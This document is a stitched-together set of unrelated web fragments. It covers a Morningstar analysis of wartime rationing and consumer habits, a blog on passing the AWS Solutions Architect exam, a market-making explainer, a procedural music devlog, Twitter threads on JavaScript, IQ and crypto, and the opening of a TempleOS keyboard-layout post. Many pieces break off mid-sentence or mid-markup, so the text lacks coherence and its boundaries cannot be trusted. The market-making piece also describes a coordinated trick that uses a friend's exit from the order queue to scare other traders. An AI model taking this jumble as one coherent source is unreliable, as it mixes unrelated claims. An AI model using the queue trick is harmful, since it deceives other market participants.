Now that they've gotten more comfortable with shopping online, they might continue to do so out of convenience long after the pandemic.</span></p><p><strong><span data-v-76f3ace6="" data-v-03c6dd16="" data-v-4387a7d2="">How Do Extreme Shocks Drive Long-Term Economic Behaviour?</span></strong><br data-v-4387a7d2="" data-v-03c6dd16=""><span>To better understand how the world might look different after COVID-19, we used these three concepts in our analysis of the five analogous historical episodes that had a significant short-term impact on consumer behaviour.</span></p><p><span>The exhibit below maps out the degree to which each of these episodes led to fundamental long-term changes in economic behaviour, based on these three means.</span></p></div>
<p data-v-4387a7d2="" data-v-03c6dd16="" data-v-7ba8d775=""><span><img src="https://www.morningstar.co.uk/static/UploadManager/Assets/Avenues%20for%20change%208%201.PNG" alt="Five Case Studies" width="1141" height="539"></span></p>
<p data-v-4387a7d2="" data-v-03c6dd16="" data-v-7ba8d775=""><span><span>Altogether, our analysis of these historical episodes indicates that there's, at best, modest support for the idea that COVID-19 will affect long-term consumer habits.</span><p><span>Each of these shocks had some impact on short-term consumer behaviour, but more often than not, habits eventually reverted to more closely resemble previous behaviours and fear subsided sooner or later. Though each episode was unique, we note that sunk costs were the means through which a longer-term impact most frequently occurred.</span></p><p><strong><span data-v-76f3ace6="" data-v-03c6dd16="" data-v-4387a7d2="">The Economic Impact of Food Rationing During World War II</span></strong><br data-v-4387a7d2="" data-v-03c6dd16=""><span>Residents of the United Kingdom were subject to rationing of some combination of petrol, meat, fish, cheese, and more between 1939 and 1954. The island nation imports approximately 70% of its food and was therefore exposed to massive supply-chain disruption as a result of World War II. The rationing continued after the war as the U.K. redistributed food and resources to war-devastated countries under British control.</span></p><p><span>Did this period of deprivation have a lasting impact on consumer behaviour? The fact that it lasted for so long makes the possibility of permanent change seem more likely.</span></p><p><span>The exhibit below shows the sharp negative impact that rationing had on the demand for key food items. At their respective troughs, per capita meat consumption declined as much as 32%, fat (butter, margarine, and others) 21%, sugar 35%, and eggs 64%.</span></p></span></p>
<p data-v-4387a7d2="" data-v-03c6dd16="" data-v-7ba8d775=""><span><span><img src="https://www.morningstar.co.uk/static/UploadManager/Assets/Avenues%20for%20change%208%202.PNG" alt="U.K. Rationing" width="1142" height="741"></span></span></p>

<p data-v-4387a7d2="" data-v-03c6dd16="" data-v-7ba8d775=""><span><span>However, Britons clearly didn't get accustomed to these austere eating habits. Food consumption rebounded in the early 1950s as rationing was relaxed, and by the mid-1950s, consumption of meat, fat, sugar, and eggs was far in excess of prewar levels.</span><p><span>Therefore, wartime rationing didn't have a noticeable long-term economic impact; in general, our analysis shows that demand for rationed goods fully recovered after the war.</span></p><p><strong><span data-v-76f3ace6="" data-v-03c6dd16="" data-v-4387a7d2="">Did World War II Advance the Rise of Women in the Workforce?</span></strong><br data-v-4387a7d2="" data-v-03c6dd16=""><span>Also during World War II, the number of men off at war and wartime production needs led to a spike in the number of women working outside the home. These catalysts didn't last—the men came home, and those elevated wartime production levels died down—but did this episode play a role in the continued rise of women in the workforce?</span></p><p><span>Habit may have played a role in this shift as both women and their families became more accustomed to their working. Sunk costs also had some importance as firms needed to experiment with employing more women—and, by all accounts, this experiment was successful in terms of productivity.</span></p><p><span>But overall, we believe the movement toward greater female labor force participation during the war had only a modest impact on the long-term trend. The fact is that female labor participation in the U.S. was already on the rise, and the 1940s hardly stand out in terms of the trend's longer-term adoption.</span></p><p><span>The exhibit below shows that the increase during the 1940s tracks with that of other decades—about 6 percentage points, right in line with the average decade from 1930 to 1990.</span></p></span></p>

<p data-v-4387a7d2="" data-v-03c6dd16="" data-v-7ba8d775="">One could argue that the fast growth in the decades after the 1940s was jump-started by the war, but we think other factors were more important. For instance, economists have proposed the importance of:</p>

December 6, 2020 | https://luminousmen.com/post/remote-aws-certification-exam | <a href="https://web.archive.org/web/*/https://luminousmen.com/post/remote-aws-certification-exam">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>In this post, I will talk about my experience with AWS certification for Solution Architect Associate and how I prepared for it.</p>
<p>AWS certification allows the developer to confirm his qualification and skills in working with AWS services. And the preparation process itself provides additional experience in working with AWS services. But besides all of this, you also get knowledge about architectural patterns that can be applied anywhere else, how solutions are built in the cloud, their limitations and problems.</p>
<hr>
<p>Documentation and videos on the AWS services pages are certainly not a bad start, but to prepare for the exam it would be very good to have experience in the cloud and system knowledge. But it is not necessary — you can catch up on online courses.</p>
<p>I personally started with "<a href="https://www.udemy.com/course/aws-certified-solutions-architect-associate/">AWS Certified Solutions Architect - Associate 2020</a>" from "A Cloud Guru". I passed it on Udemy, but there are other platforms, including their <a href="https://acloudguru.com/course/aws-certified-solutions-architect-associate-saa-c02">own website</a>.</p>
<p>The course was quite good. I liked the combination of theoretical materials and practical tasks where you could get your hands dirty. I had some professional experience using AWS, so I already knew and saw many things but the course easily fills in the blanks for services that I didn't use.</p>
<p>Also, within the course, there are many links to additional resources and best practices from AWS itself. They are definitely worth taking a look. And at the end there a several exam tests with the questions from the previous year's exams. Going through them gives me an idea of what format of questions I will get at the exam.</p>
<p>However, after all the lectures and exercises, the course will probably not be enough to gain a passing score on the exam. So, in addition, closer to the exam to consolidate and systematized my knowledge, I took a short course from <a href="https://www.aws.training/Details/Curriculum?id=20685">Amazon Exam Readiness: AWS Certified Solutions Architect - Associate</a>. It is free and does its job well.</p>
<p>It seemed inefficient to review all the courses again in the next step. Instead, I tried to find more exam questions with detailed explanations. I found a collection of close to exam questions on <a href="https://www.udemy.com/course/draft/1520628/">Udemy</a>. This course is no longer accepting enrollments for some reason, but you easily can find similar ones.</p>
<p>Each question is explained in detail with an explanation of the correct options and links to the AWS documentation. Going forward, I will say that the questions are really close to the ones you can get in a real exam.</p>
<p>I spent a long time with those tests, but in the end, I began to gain more than 70%. In the process, I solved each of them twice. On average, it took me an hour and a half to perform a test and then two or three more hours to analyze it. But it was worth it to do it. I got confidence and an understanding of the logic of the questions.</p>
<h3>AWS online exam</h3>
<h4>Before the exam</h4>
<p>You can take the exam yourself either at a certified center or at home online (Pearson VUE app). Due to the fact that no other certification center close to me worked on weekends, I decided to take the exam at home.</p>
<p>The exam takes 140 minutes and consists of 65 questions. Most often you need to pick one option out of four, although there are two options out of four or two options out of six. The questions are mostly very large and describe a typical scenario for choosing the right solutions from the AWS world. A passing score of 72%.</p>
<p>The cost of certification is $150 (and for $20 you can get a trial online version).</p>
<p>There are detailed requirements and guidelines for taking the exam. Everything is quite reasonable. You need a laptop or PC with an Internet connection and a web camera. Test the connection and speed in advance. There should not be any notes, devices or any other turned on screens (even headphones cannot be used!) near you for the exam. If possible, the windows should be shut off. No one should enter the room where the exam is taken for the duration of the exam, the door must be closed. During the exam, you should look at the monitor so that there are no complaints from the examiner. You will not be able to go to the toilet or have a snack during the exam.</p>
<p>To pass the test you will need to install a special app that allows the examiner to monitor the screen, camera, and sound when taking the test. I advise you to install it in advance.</p>
<p>All this information is available before the test at <a href="http://pearsonvue.com/">pearsonvue.com</a>.</p>
<h4>Starting the exam</h4>
<p>Frankly speaking, I could not start the exam for the first time — the examiner (in terms of Pearson Vue is called a "proctor") for the first time did not appear after I waited for about an hour. Judging by the feedback on Reddit, this happens quite often, so be prepared for it. After I wrote a letter to support I was allowed to reschedule the exam.</p>
<p>On the day of the exam, 15 minutes before the appointed time, I opened the Pearson Vue application and started to fill in the necessary fields. To confirm your identity, you must take a photo of your driver's license or passport. What is interesting, you can take a photo either on the phone or on the web. More for the sake of interest, I chose the option to take pictures with a camera on the phone. After a couple of seconds, I received a link in SMS. Following the prompts, I took the picture of my license and then the pictures of the room on the four sides. After the final confirmation on the phone, a couple of seconds later the screen on the laptop changed, saying that everything is ready for the exam.</p>
<p>After about five minutes the examiner wrote to me in a chat and then called me. Before the beginning, I was asked to remove the documents from the table because there should be nothing left on the table and then asked to spin a laptop camera. I suppose — to make sure that everything in the room corresponds to the photos received earlier. I received a wish of luck and the exam started.</p>
<h4>During the exam</h4>
<p>The interface with questions was unusual at first, but then I got involved in the process and no longer paid attention to the appearance. I'm a little screwed up with the timing — I spend too much time reading and thinking about the first half of the questions. I was hurrying through the second half, sometimes I did not even finish reading the question to make it to the end.</p>
<h4>Happy ending</h4>
<p>After more than two hours of intense thinking, you could finally relax. The examiner did not connect to me anymore — the exam ended by itself. In the end, you can see the most important thing — have you passed or have not passed the exam. This happens automatically. But the number of points comes in a couple of days.</p>
<p>A couple of days later I received a nice letter "Congratulations, You are Now AWS Certified".</p>
<h2>Conclusion</h2>
<p>Solutions Architect Associate is a relatively simple certification, which gives an overview of AWS and small technical knowledge of the most important topics. It can be passed even by people who have little to do with IT and being a programmer is certainly not a requirement.</p>
<p>But the next step — Solutions Architect Professional — is a challenge even for people with good AWS experience.</p>
<p>Many people are attracted by an increase in salary after obtaining certificates. My salary has not been affected in any way.</p>
<p>It is not a big deal to have a certificate. What people really look at is the experience and successful projects. Certification by itself does not cover many aspects that are related to real tasks. Sophisticated VPC, deployment of env through CloudFormation, ECS/EKS, VPN /Direct connect, etc...</p>
<p>But I'll repeat this is a nice addition to the resume and adds knowledge about architectural patterns, how solutions are built in the cloud, their limitations and problems.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>November 19, 2020<!-- --> • ☕️ 7 min read</p></header><p>In the <a href="https://blog.mushino.com/market-making-101:-part-1/" target="_blank" rel="nofollow noopener noreferrer">last section</a> of this series we covered the very basics of market making.</p><p>We covered the fundamentals that make market making a viable strategy and introduced the adverse selection problem.   </p><p>In this article we will explore some simple ways to deal with the adverse selection problem.</p><p>Quick recap from the previous article: Adverse selection is what happens when someone is more informed than you. It’s how you end up losing money as a market maker. If you were to do a very naive market making strategy, where you simply copy the best bid and the best ask from the order book, and quote those prices yourself, you would end up losing a lot of money.</p><h2 id="the-steamroller-analogy"><a href="#the-steamroller-analogy" aria-label="the steamroller analogy permalink"></a>The steamroller analogy</h2><p>Market making is often described as “picking up pennies in front of a steamroller”. This is a surprisingly accurate analogy.</p><p>The steamroller is the market. You have no way of knowing where it’s going. It might be stationary for a while, while it’s doing its work, and then suddenly take off in one direction. If you get run over by the steamroller, you might lose a leg or two.  </p><p>The steamroller is surrounded by a huge pile of pennies. Anyone can pick up these pennies - but in order to pick them up, you must two basic rules.</p><figure>

  </figure><h2 id="the-first-rule"><a href="#the-first-rule" aria-label="the first rule permalink"></a>The first rule</h2><ul><li>Before picking up any pennies, you must purchase a ticket from the ticket seller.</li></ul><p>Why? Because picking up pennies isn’t free. The steamroller is serviced by a company, and this company requires money to run.</p><p>You can think of the company as your broker or exchange. Your broker doesn’t control the market, but they require you to commit a certain amount of capital to participate in the market. This is like buying a ticket. Once you have successfully picked up your pennies, you’ll show your ticket at the exit, and get the money that you committed back. If you get run over by the steamroller, you’ll lose your ticket, and in turn, the money that you committed.</p><p>The amount of pennies you can pick up is directly correlated to the amount of capital that you commit. If you purchase the cheapest ticket, you’ll only be able to pick up a single penny. If you purchase the most expensive one, you’ll be able to pick up 100 pennies.</p><p>The more expensive the ticket, the more you can profit, and the more you can lose.   </p><p>In practice, the amount of capital to commit will be guided by money management formulas such as the <a href="https://en.wikipedia.org/wiki/Kelly_criterion" target="_blank" rel="nofollow noopener noreferrer">Kelly Criterion</a>.</p><p>Professional market makers have been run over by the steamroller many times. They know their approximate chance of getting away in time, and will size their positions based on that. In a future article, we will cover position sizing in more detail.</p><figure>

Everything good.</p><p>Just repeat the process a few million times, until you are rich. Preferably by having some automated algorithm do the work for you.</p><p>Sounds good, right?</p><p>Not so fast. If you just pick up your pennies blindly, without paying attention to your surroundings, there’s a good chance that you will get run over too often, and will end up losing all your money.</p><p>Why? Because some of the other people in the queue are insiders. These guys happen to know the guy driving the steamroller. The guy in the steamroller will pick up his phone and call them just before he decides to push the accelerator:</p><p><em>“Hey friends, I’m about to take off, leave the queue and get the fuck out if you don’t wanna get run over.”</em></p><p>The insiders will then abandon the queue and leave everyone else behind. Other people in the queue will naturally start following suit, as they think to themselves:</p><p><em>“Why are all these guys leaving the queue? Could they be insiders? I better leave as well.”</em></p><p>Some of them will make it out in time, and others won’t.</p><p>This is the adverse selection problem at play. Some people are simply more informed than others, and will have an edge based on that.  </p><p>You can’t be an insider yourself (if you could, you wouldn’t be reading this article), but you can use the changes in your surroundings to your advantage.</p><figure>

  </figure><h2 id="queue-positioning"><a href="#queue-positioning" aria-label="queue positioning permalink"></a>Queue positioning</h2><p>If you’re waiting to pick up the pennies, you MUST pay attention to the queue. If a huge amount of people are leaving the queue, you should probably leave as well.</p><p>There will always be some natural churn (people that get tired of waiting, or people that need to pee), but if half the people are leaving, there’s a good chance that something is up.  </p><p>Furthermore, you must pay attention your position in the queue. Some positions are more advantageous than others.</p><p>If you’re in a very advantageous position, you want to be very careful about leaving.</p><p>An example of a very advantageous position is when the queue is super long, and you are in the front-most 20 percent. You want to have a very good reason for abandoning a queue position like that (e.g. half of the people behind you leaving).  </p><h2 id="getting-ahead-in-the-queue"><a href="#getting-ahead-in-the-queue" aria-label="getting ahead in the queue permalink"></a>Getting ahead in the queue</h2><p>Let’s imagine that you are at the back of the queue, together with your friend, and that you guys want to get to the front fast.</p><p>What can you do?</p><p>If your friend is willing to cooperate, you might be able to play a few tricks.</p><p>Your friend will give up his position in queue. This will make other people nervous. They’ll start asking themselves: “Why is this guy leaving? Is he an insider?” Some of them might even leave.</p><p>This trick works best when your friend has bought a very expensive ticket. People will think: “Why is this whale leaving? Surely there must be something up?”</p><p>If executed correctly, this trick can net you several positions. It comes at the expense of your friend, who now has to rejoin the queue. Because of that, you only want to do it when both of you are at the back of the queue (and have nothing to lose, in terms of queue positioning).</p><figure>

Why? Because the queue is facing the steamroller. When the steamroller starts rolling, the guys that stand furthest ahead in the queue will be the guys that get run over first.</p><p>The more people in the queue, the greater your chance of getting out in time.   </p><p>The first guy to get run over will be the guy picking up the penny.

And then run like crazy.</p><p>If the next person in the queue is not paying attention, and hasn’t realized that the steamroller has started rolling yet, he will run towards the penny and try to pick it up.

  </figure><p>The trading analogy to this is to place an Immediate-Or-Cancel order at the price your limit order got filled. If you got a bid filled, the order will need to be a SELL order. If it was an ask, it will need to be a BUY order.</p><p>The idea is to cancel out your newly opened position before the price level breaks. This way you won’t suffer any losses (except for the taker fees you pay on your Immediate-Or-Cancel order). The guy who suffers losses will be the guy who was behind you in the queue. This is called “scratching” a trade.</p><p>Scratching only works if there are people behind you in the queue (i.e. on the same price level as you) that are not paying attention.</p><p>But let’s be real - people tend to get a bit lazy while standing in queues for long periods of time. If the queue is long, there is a good chance that at least some of the people there are not paying attention. Maybe they are daydreaming, maybe they are talking to their friend, maybe they are looking the other way. This is your opportunity to cut your losses and avoid getting rolled over.   </p><p>Scratching comes at a cost. You pay expensive taker fees to get your order filled quickly. Unless your taker fees are zero, you don’t wanna do it too often.</p><h2 id="tracking-your-queue-position"><a href="#tracking-your-queue-position" aria-label="tracking your queue position permalink"></a>Tracking your queue position</h2><p>Until now we have assumed that you always know your exact position in the queue. This is not an accurate assumption. In reality, the queue can be extremely long, and you may not always be capable of counting the amount of people standing in front of you.</p><p>This is where you need a sophisticated queue tracking system. All the pro market makers have their own queue tracking systems - which they dedicate a lot of resources to. Building one is not trivial - you will need to record every market event (people entering the queue, people leaving the queue, people getting filled), and chain these events together.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>"I don't think that this could ever create something that I wouldn't mute" </p><p><em>- Voxel, laying down the hard truths about music generation in general and my music generator in specific</em></p></blockquote><p>In groovelet32.exe, I’d like for the art assets to be capable of wiggling and booping in time with the music. </p><p>That’s seemingly simple sounding, but that simple idea contains, uh, <em>multitudes</em>.</p><p>This can be accomplished in one of a few different ways: </p><ol><li><p>Buy, commission, or write music, transcribe the music whole into the execution environment and play the music with locally available music generation tools (Tone.js in JavaScript, Helm or wwise in Unity) </p></li><li><p>Buy, commission, or write music, transcribe important moments in written music into software language, have instrument hits trigger effects.</p></li><li><p>Buy, commission, or write music, use automated analysis (Koreographer in Unity) to guess when dynamics are occcuring in the music and use those to trigger effects.</p></li><li><p>Buy, commission, or write music, output music as midi, play music while using midi engine to drive effects. </p></li><li><p>Generate music entirely in place, have instrument hits directly trigger effects.</p></li></ol><p>Each strategy has its ups and downs. Notably, the first four strategies start with the simple-sounding but imposing “buy, commission, or write music”. Buying music - well, it’s hard to build a whole game around stock music - especially if music is as fundamental to the experience as it should be in a game about musical robots. </p><p>Commissioning music is simply too expensive, if I’m planning on paying my composer fairly (which I would be, if I had any money).</p><p>Writing music on my own would imply a strong upgrade in my own personal music production skills, because currently I’m operating at somewhere near the “Three Blind Mice” level. A number of my family members are talented musically - my younger brother married into a “music teacher” family - but I don’t think any of them have ever cracked open a <a href="https://en.wikipedia.org/wiki/Digital_audio_workstation">DAW</a>, and they’re pretty busy with their own lives, so that’s a hard tree to shake and expect that video-game ready tunes will fall out.</p><p>So that leaves me with <strong>procedurally generated music</strong>. It’s perhaps naive to think that I, a person who can’t even write a regular song, could build a computer that could write music for me, but hey - if I’m good at anything¹ , it’s programming.</p><h2>A Basic Architecture for Procgen Music</h2><p>Some time back, I watched this inspiring JSConf talk: </p><p id="youtube2-_0ij8vY2gzE" data-attrs="{&quot;videoId&quot;:&quot;_0ij8vY2gzE&quot;,&quot;startTime&quot;:null,&quot;endTime&quot;:null}"><iframe src="https://www.youtube-nocookie.com/embed/_0ij8vY2gzE?rel=0&amp;autoplay=0&amp;showinfo=0" frameborder="0" gesture="media" allow="autoplay; fullscreen" allowautoplay="true" allowfullscreen="true"></iframe></p><p><em>so cool</em></p><p><strong>tl;dr</strong> “we built a tool called <a href="https://magenta.tensorflow.org/js-announce">Magenta.js</a> that allows you to tensorflow up some tunes”</p><p>I like tensorflow! I like tunes!</p><p>Setting upon the task with some zeal I managed to get Magenta.js generating tunes, slowly. I had a simple plan for how I would take slowly-generated 8-second tunes and convert them into longer songs:</p><ol><li><p>Have a background server process generate 8-second three-part-tune clips</p></li><li><p>Use some basic heuristics to guess at the key signature (“C# major”) of the clips, evaluate their intensity (lots of drum hits? loads of notes?) and save them in a huge clip database.</p></li><li><p>Create a search interface for the clip database.</p></li><li><p>Have the client request clips from the server in a specific key and intensity.</p></li><li><p>Weave two or three clips together, repeating them a couple of times, to make a full “song”.</p></li><li><p>Add tools to control the requested key signature, intensity, and change instrument, tempo, and what-have-you at the last second.</p></li><li><p>Take the output and make it sound like real human music that people would listen to on purpose.</p></li></ol><p>Now, there are some definite problems with this scheme. One of them is <a href="https://tonejs.github.io/">Tone.js</a> - an unbelievably powerful synth workbench written for people who have read<a href="http://msp.ucsd.edu/techniques/latest/book-html/"> the entire book on Digital Signal Processing</a>, and <em>no other people</em>.</p><p>I actually took and passed a senior-level course in DSP for music generation, some 12 years ago. I have less of an excuse than the average person to be absolutely garbage at attaching oscillators to things. I’m still garbage, mind you, I just have less of an excuse.</p><p>Anyways, after some serious effort, I got steps 1-6 working.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fca1c57c1-7653-4b87-af3b-44ec32498063_624x749.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fca1c57c1-7653-4b87-af3b-44ec32498063_624x749.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ca1c57c1-7653-4b87-af3b-44ec32498063_624x749.png&quot;,&quot;height&quot;:749,&quot;width&quot;:624,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:41766,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>Look at that! Sliders! Tempo! Intensity! Configurable per-channel instruments and levels! </p><div><p>Here’s the first song that ever sounded remotely passable, produced by the system.</p><p>It’s… <em>okay</em>, right? Not <em>bad</em>. That’s where the system was a year ago.</p></div><p>Here’s another song from just a few days ago: </p><div><p>Admittedly, I haven’t been working on the procgen engine for that entire year, but it hasn’t evolved much in the interim, huh?</p><p>I figured I might be able to shape the musicality of the output with simple heuristic rules and adjustments and embellishments, but - I can’t. An extremely talented musician/producer might be able to, but as we’ve established, I’m worse at finding C than <a href="https://www.youtube.com/watch?v=VCr91EwGGxk">the salty pirates of landlocked Saskatchewan</a>. </p></div><p>Most of my clever changes would make the output sound better… some of the time. And worse, some of the time. Sometimes, rarely, the system produces something that, if you weren’t paying a terrible lot of attention, you might confuse for real music. A lot of the time it produces something bland and amusical. About as often it produces something <em>actively unpleasant</em>.</p><p>One idea I’ve had is building an underlying voting system to try to clear “bad” tunes out of the system - if my music generation system is actually powered by a thousand clips that sound pretty good under most any circumstances because all of the ones that sound bad have been downvoted out of existence, well, that’s one way of doing things.</p><p>But even at it’s best, the output isn’t… terribly good. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Faa2c453a-e28c-4d54-8a6f-02ea23b50ff9_534x577.webp"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Faa2c453a-e28c-4d54-8a6f-02ea23b50ff9_534x577.webp" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/aa2c453a-e28c-4d54-8a6f-02ea23b50ff9_534x577.webp&quot;,&quot;height&quot;:577,&quot;width&quot;:534,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:138006,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/webp&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><div><p>And a big part of the problem is just that composing music is <em>hard</em>.

(A lot of procedurally generated/input driven music uses a technique like this).</p><p>It’s packed with cool ideas involving graphs and rules engines and a bunch of stuff that gets me actively excited. One of the contributing authors uses the term “gestalt” a few too many times.</p><p>A big part of the book was just talking about <strong>when</strong> to use procedural generation.</p><p>I’d summarize the book’s answer as “if you’re reading this, less than you imagine”.    </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc8ac403-70e9-4356-bbc5-b01b4dd1d353_910x529.webp"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fbc8ac403-70e9-4356-bbc5-b01b4dd1d353_910x529.webp" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/bc8ac403-70e9-4356-bbc5-b01b4dd1d353_910x529.webp&quot;,&quot;height&quot;:529,&quot;width&quot;:910,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:9114,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/webp&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p><em>this, for example, is probably too big a promise, unless they mean just the clouds</em></p><p>The benefits of generated content are obvious.

              </a><p>

            
            I wonder why Java was so respected and JS was not? Why/how was Java already seen as such a stable and mature language? </p><p>   Not just Java, other languages (like python) were also released around/near 95, and also seemed to get to "mature" respect status. much quicker.
            

            

            </p></div>

              </a><p>

            
            I bring all this up because my impression of Java in 98 was that it had been around "forever" (as had C++ first developed in 79, but not standardized until 98!), but that's not. true at all. These were all new languages around the same time.
            

            

            </p></div>

              </a><p>

            
            I'm sure the language designs had different merits, and the target applications meant a different perception and reception, but... </p><p>   it sure seems like the industry (and academics) just decided Java and C++ were the stable mature ones and langs like JS were toys.
            

            

            </p></div>

            





            <div>
	      <a href="https://twitter.com/getify/status/1335216356124483586" target="_blank">
              
              </a><p>

            
            BTW, before you assume JS was nascent/immature b/c the web wasn't much of a thing yet, remember that JS was actually released as LiveScript on the server before it was released in a browser. So "server-side JS" was always part of the story, not just Node 15 years later in 2009.
            

            

            </p></div>

            





            <div>

              </a><p>

            
            Why didn't "we" push JS on the server the way Java and C++ were pushed in that space? </p><p>   Why wouldn't a university consider teaching JS alongside Java and C++ (and python), given they were all roughly the same age?
            

            

            </p></div>

            





            <div>

              </a><p>

            
            My point is, technologies and ideas don't always win on merits the way we hope/claim. More often than we admit, we just pick winners based on less tangible things like marketing.
            

            

            </p></div>

            





            <div>

              </a><p>

            
            There's a lot of tech (frameworks, tools, etc) floating around that are just as mature/stable/useful as the hyped bandwagon stuff, just without the huge community, fancy logos, conferences, and big corporate backers. </p><p>   They're the "Java" and "C++" of today. They've been chosen.
            

            

            </p></div>

              </a><p>

            
            Through a variety of intentional and accidental effects (like marketing), they're the "winners" right now.  </p><p>   But a lot of equally worthy candidates are floating around waiting for their moment (which may or may not ever come).
            

            

            </p></div>

              </a><p>

            
            Are there any "toys" (tech that's not respected) right now that might accidentally end up ruling the world 25 years from now? What would you place your long-future bets on?

                     THREAD: 12 Things Everyone Should Know About IQ<p>1. IQ is one of the most heritable psychological traits – that is, individual differences in IQ are strongly associated with individual differences in genes (at least in fairly typical modern environments). https://t.co/3XxzW9bxLE


            
            </p><div>
              <p><img src="https://pbs.twimg.com/media/Dq6XdzvVAAEoKwf.jpg">
              </p>
            </div>
            

            
            
            
            

            <p>
              2. The heritability of IQ *increases* from childhood to adulthood. Meanwhile, the effect of the shared environment largely fades away. In other words, when it comes to IQ, nature becomes more important as we get older, nurture less. </p></a><p><a href="https://t.co/UqtS1lpw3n" rel="nofollow">https://t.co/UqtS1lpw3n</a></p><div>
              <p><img src="https://pbs.twimg.com/media/Dq6XzacVYAEA8tk.jpg">
              </p>
            </div>
            

            


            

            <p>
              3. IQ scores have been increasing for the last century or so, a phenomenon known as the Flynn effect. <a href="https://t.co/sCZvCst3hw" rel="nofollow">https://t.co/sCZvCst3hw</a> (N ≈ 4 million)</p><p>(Note that the Flynn effect shows that IQ isn't 100% genetic; it doesn't show that it's 100% environmental.)
              
              
            </p><div>
              <p><img src="https://pbs.twimg.com/media/Dq6X70oU8AAgR5n.jpg">
              </p>
            </div>
            

            


            

            <p>
              4. IQ predicts many important real world outcomes.</p><p>For example, though far from perfect, IQ is the single-best predictor of job performance we have – much better than Emotional Intelligence, the Big Five, Grit, etc. <a href="https://t.co/rKUgKDAAVx" rel="nofollow">https://t.co/rKUgKDAAVx</a> <a href="https://t.co/DWbVI8QSU3" rel="nofollow">https://t.co/DWbVI8QSU3</a></p><div>

              </p>
            </div>
            

            


            

            <p>
              5. Higher IQ is associated with a lower risk of death from most causes, including cardiovascular disease, respiratory disease, most forms of cancer, homicide, suicide, and accident. <a href="https://t.co/PJjGNyeQRA" rel="nofollow">https://t.co/PJjGNyeQRA</a> (N = 728,160)

                  <div>
                   
                  <div>

                  <div><p><a href="https://buzzchronicles.com/b/crypto/1005">
                     So the cryptocurrency industry has basically two products, one which is relatively benign and doesn't have product market fit, and one which is malignant and does. The industry has a weird superposition of understanding this fact and (strategically?) not understanding it.


            

            
            </a></p>
            
            
            
            

            <p>
              The benign product is sovereign programmable money, which is historically a niche interest of folks with a relatively clustered set of beliefs about the state, the literary merit of Snow Crash, and the utility of gold to the modern economy.
              
              

            


            

            </p><p>
              This product has narrow appeal and, accordingly, is worth about as much as everything else on a 486 sitting in someone's basement is worth.
              
              

            


            

            </p><p>
              The other product is investment scams, which have approximately the best product market fit of anything produced by humans. In no age, in no country, in no city, at no level of sophistication do people consistently say "Actually I would prefer not to get money for nothing."
              
              

            


            

            </p><p>
              This product needs the exchanges like they need oxygen, because the value of it is directly tied to having payment rails to move real currency into the ecosystem and some jurisdictional and regulatory legerdemain to stay one step ahead of the banhammer.
              
              

            


            
            


                    </p></div>
                
                </div>
              
              

                 </div>

                    
              </div>

<h2>Introduction</h2>

<p>This blog post is written with purpose of memorizing the process of making my university assignment for bachelor thesis, and I'm making it public in case someone makes use of it for their purposes too.</p>

<p>My assignment was creating keyboard layout and custom characters for TempleOS operating system, and adding a feature for dynamic switching between different keyboards, but before describing the process, some background would be nice.</p>

<p>If you're reading this blog post, you most certainly know about the operating system I work in and its creator, Terry A. Davis, but for those who don't know <a href="https://en.wikipedia.org/wiki/Terry_A._Davis">Wikipedia</a> has most of the stuff not relevant to this blog post covered.</p>

<p>What is important pointing out though is the fact that all the source code and documentation is located in the operating system itself. But to spare you the tedious process of creating virtual machine and installing OS itself, most of the content is located on <a href="https://templeos.holyc.xyz/%22">website</a>.</p>

<p>So, let's get to the process of creating this thing, shall we?</p>

<h2>Making external characters</h2>

<p>Browsing through the OS demos, which can be accessed through <code>Cd("/Demo");</code>, with a little assistance of more experienced TempleOS developers (big shout out to TempleOS Riot community), I discovered a file called <i>ExtChars.HC.Z</i>, which documented the process of creating external characters.</p>

<p>In the example provided by author himself, mr. Davis, he specifically made a smiley character. Upon closer inspection, one can conclude that TempleOS uses bit-per-pixel system, meaning that one 1 represents pixel, and 0 represents nothing. He uses 8x8 bits for drawing characters.</p><p>His character looked like</p>

<code>
    U8 face[8]={<p>
    
    0b00111100,<br>
